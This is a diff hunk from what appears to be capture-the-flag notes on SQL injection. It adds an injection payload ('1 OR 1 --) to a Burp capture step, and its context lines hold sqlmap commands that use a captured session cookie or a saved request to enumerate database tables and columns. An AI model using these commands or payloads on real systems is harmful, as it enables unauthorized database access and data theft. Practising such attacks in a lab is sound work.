@@ -122,7 +122,7 @@ $ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME
 Have a look at Hajiv
 
 Another SQL injection attack to capture flag from a page
-Open Burp and capture the web request
+Open Burp and capture the web request (user admin '1 OR 1 --)
 Copy the request to a file
 $ sqlmap -r <txt file from burpsuite> -D <database name> --tables
 $ sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns
